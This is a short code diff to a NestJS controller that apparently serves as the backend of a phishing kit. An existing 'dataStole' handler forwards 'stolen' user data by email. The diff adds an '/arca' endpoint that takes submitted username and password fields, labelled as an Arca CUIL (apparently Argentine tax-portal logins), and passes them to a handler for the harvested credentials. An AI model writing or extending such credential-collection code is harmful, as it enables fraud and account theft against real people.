@@ -1,4 +1,4 @@
-import { Controller, Get, Body, Request, Post } from '@nestjs/common';
+import { Controller, Get, Body, Request, Post, Param } from '@nestjs/common';
 import { AppService } from './app.service';
 import { IUserStolen } from './utils/interfaces';
 
@@ -15,6 +15,12 @@ export class AppController {
   dataStole(@Body() req: IUserStolen): number {
     console.log(req)
     this.appService.emailData(req)
+    return 0;
+  }
+
+  @Post('/arca')
+  arcaData(@Body() req) {
+    this.appService.arcaData('Arca cuil: '+req["F1_username"]+" / "+req['F1_password'])
     return 0;
   }
 }
